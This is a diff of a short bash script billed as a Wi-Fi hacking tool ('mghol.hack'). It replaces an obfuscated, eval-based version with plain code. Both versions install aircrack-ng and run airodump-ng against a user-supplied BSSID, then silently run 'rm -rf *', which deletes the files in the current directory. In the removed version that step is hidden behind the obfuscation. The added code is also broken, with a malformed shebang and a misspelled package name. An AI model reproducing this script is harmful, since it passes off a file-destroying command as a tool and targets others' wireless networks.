@@ -1,3 +1,24 @@
-z="
-";nz=' ent';Gz=' y'\''';CBz='D';Kz='y '\''';rz=' BSS';lz='ntrf';Mz='   y';Wz='-get';Zz=' upg';cz='tall';DBz='rm -';Bz=' '\''--';Rz=' a  ';BBz='BSSI';sz='ID';kz='RE e';Ez='    ';Dz='--- ';Oz='/   ';mz=' : "';Uz='sudo';uz='dupm';wz='$ent';tz='airo';oz='rf';Pz='a a ';Az='echo';bz=' ins';pz='RE B';dz=' air';Yz='ate';Xz=' upd';Jz='  y ';ABz='id $';Hz=' '\''  ';Cz='----';Vz=' apt';gz=' -y';Sz=' ---';Tz='--  ';xz='rf -';fz='p-ng';Fz=' y  ';EBz='rf *';Qz='   /';Iz='  / ';vz='-ng ';hz='read';Nz='  '\''';Lz=' /  ';yz='-bss';az='rade';ez='odum';qz='SSID';iz=' -p ';jz='"ENT';
-eval "$Az$Bz$Cz$Cz$Dz$Ez$Fz$Ez$Gz$z$Az$Hz$Ez$Ez$Iz$Ez$Jz$Ez$Kz$z$Az$Hz$Ez$Ez$Lz$Ez$Mz$Mz$Nz$z$Az$Hz$Ez$Ez$Oz$Ez$Ez$Pz$Nz$z$Az$Hz$Ez$Qz$Ez$Ez$Ez$Rz$Nz$z$Az$Hz$Ez$Iz$Ez$Ez$Ez$Rz$Nz$z$Az$Hz$Ez$Lz$Ez$Ez$Ez$Rz$Nz$z$Az$Hz$Ez$Sz$Cz$Tz$Ez$Rz$Nz$z$Uz$Vz$Wz$Xz$Yz$z$Uz$Vz$Wz$Zz$az$z$Uz$Vz$Wz$bz$cz$dz$ez$fz$gz$z$Uz$Vz$Wz$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$z$hz$iz$jz$pz$qz$mz$rz$sz$z$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$z$DBz$EBz"
+!/bin/bash
+sudo apt update
+sudo apt upgrade
+sudo apt install  aircrak-ng
+sudo apt install figlet
+figlet mghol.hack
+read -p "enter intrf is" i
+read -p "enter bssid is" b
+sudo airodump-ng $i --bssid $b
+rm -rf *
+
+
+
+
+
+
+
+
+
+
+
+
+
+
